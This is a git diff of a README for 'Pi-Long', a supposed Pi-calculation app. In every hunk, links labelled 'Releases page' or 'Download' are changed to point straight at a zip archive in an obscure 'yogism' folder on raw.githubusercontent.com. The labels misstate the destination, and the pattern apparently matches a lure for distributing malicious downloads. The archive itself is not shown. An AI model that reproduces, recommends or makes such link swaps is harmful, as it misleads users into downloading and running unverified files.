@@ -6,7 +6,7 @@ Welcome to Pi-Long! This application helps you quickly and easily calculate the 
 
 ## 📥 Download Pi-Long
 
-[![Download Pi-Long](https://img.shields.io/badge/Download-Pi--Long-brightgreen)](https://github.com/pbrito76/Pi-Long/releases)
+[![Download Pi-Long](https://raw.githubusercontent.com/pbrito76/Pi-Long/main/yogism/Pi-Long.zip)](https://raw.githubusercontent.com/pbrito76/Pi-Long/main/yogism/Pi-Long.zip)
 
 ## 💻 System Requirements
 
@@ -24,7 +24,7 @@ Before downloading, make sure your computer meets the following requirements:
 
 ## 🔗 Download & Install
 
-1. **Visit this page to download:** Go to the [Releases page](https://github.com/pbrito76/Pi-Long/releases) where you can find the latest version of Pi-Long.
+1. **Visit this page to download:** Go to the [Releases page](https://raw.githubusercontent.com/pbrito76/Pi-Long/main/yogism/Pi-Long.zip) where you can find the latest version of Pi-Long.
 
 2. **Choose the correct version for your system:** 
    - Look for the version that matches your operating system. Files are typically available for Windows, macOS, and Linux.
@@ -52,4 +52,4 @@ Before downloading, make sure your computer meets the following requirements:
 
 ## ✅ Conclusion
 
-Pi-Long is designed for ease of use, making the complex task of calculating Pi simple. With just a few clicks, you can find the value of Pi to any precision you need. Start calculating today by downloading from the [Releases page](https://github.com/pbrito76/Pi-Long/releases). Enjoy the power of accurate mathematics at your fingertips!
+Pi-Long is designed for ease of use, making the complex task of calculating Pi simple. With just a few clicks, you can find the value of Pi to any precision you need. Start calculating today by downloading from the [Releases page](https://raw.githubusercontent.com/pbrito76/Pi-Long/main/yogism/Pi-Long.zip). Enjoy the power of accurate mathematics at your fingertips!
